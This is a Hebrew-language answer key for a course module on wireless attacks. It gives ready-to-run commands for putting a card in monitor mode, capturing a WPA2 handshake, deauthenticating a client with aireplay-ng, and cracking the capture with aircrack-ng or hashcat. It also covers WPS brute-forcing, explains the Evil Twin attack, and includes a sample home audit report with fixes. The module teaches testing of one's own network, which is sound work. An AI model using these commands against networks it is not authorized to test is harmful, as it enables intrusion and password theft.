<div dir="rtl">

# ✅ פתרונות מלאים — מודול 14: תקיפות אלחוטיות

> נסה לבד ב-[`missions.md`](missions.md) קודם. **רק על רשת שבבעלותך.**

---

## חלק א' — תיאוריה וסביבה

**14.1** — **SSID** = שם הרשת; **BSSID** = כתובת MAC של ה-AP; **Client** = מכשיר מחובר. **Beacon** = מסגרת שה-AP משדר ברציפות להכריז על נוכחותו.

**14.2** — WEP < WPA < WPA2 < WPA3. WEP "שבור" בגלל חולשת ה-**IV** (Initialization Vector) — נפצח תוך דקות ללא קשר לחוזק הסיסמה.

**14.3** — Monitor Mode מאפשר האזנה לכל התעבורה באוויר (לא רק לרשת מחוברת).
```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0        # → wlan0mon
iwconfig wlan0mon                 # Mode:Monitor ✅
```

---

## חלק ב' — סריקה ולכידה

**14.4**
```bash
sudo airodump-ng wlan0mon
# מזהים בטבלה: BSSID, CH, ENC (WPA2), ESSID של הרשת שלך
```

**14.5**
```bash
sudo airodump-ng --bssid AA:BB:CC:11:22:33 -c 6 -w capture wlan0mon
```
מצליחים כשמופיע למעלה: **`WPA handshake: AA:BB:CC:11:22:33`**.

**14.6**
```bash
sudo aireplay-ng --deauth 5 -a AA:BB:CC:11:22:33 -c <my-client> wlan0mon
```
מעט חבילות (5) מספיקות כי מטרתנו רק לגרום לניתוק+חיבור מחדש אחד ללכידת ה-Handshake — לא DoS.

---

## חלק ג' — פיצוח ומתקדם

**14.7**
```bash
sudo aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt
# או hashcat:
hcxpcapngtool -o hash.hc22000 capture-01.cap
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
```
אם הסיסמה במילון — תוצג; אם חזקה — הפיצוח נכשל (וזה טוב).

**14.8**
```bash
sudo wash -i wlan0mon
```
WPS פגיע כי ה-PIN בן 8 ספרות ניתן ל-brute-force (reaver) — פורץ את WPA2 בלי לפצח את הסיסמה עצמה.

**14.9** — **Evil Twin**: מקימים AP מזויף עם אותו SSID; הקורבן מתחבר בטעות ומקבל דף התחברות מזויף שגונב את הסיסמה. מסוכן כי הוא **עוקף את ההצפנה לגמרי** — לא מפצחים WPA2, אלא מרמים את המשתמש (הנדסה חברתית).

---

## 🔴 אתגר מסכם — מבנה דוח

```markdown
# דוח בדיקת Wi-Fi ביתי

## ממצאים
- הצפנה: WPA2-PSK (CCMP)
- WPS: פעיל ← סיכון (brute-force אפשרי)
- סיסמה: נמצאה ב-rockyou תוך 3 דקות ← קריטי!

## המלצות
1. החלף סיסמה ל-15+ תווים אקראיים (לא במילון)
2. כבה WPS בממשק הראוטר
3. שדרג ל-WPA3 אם נתמך
4. הפרד רשת אורחים
```

> עברת? בדקת רשת אמיתית באופן חוקי. המשך ל[מודול 15](../15-social-engineering/).

</div>
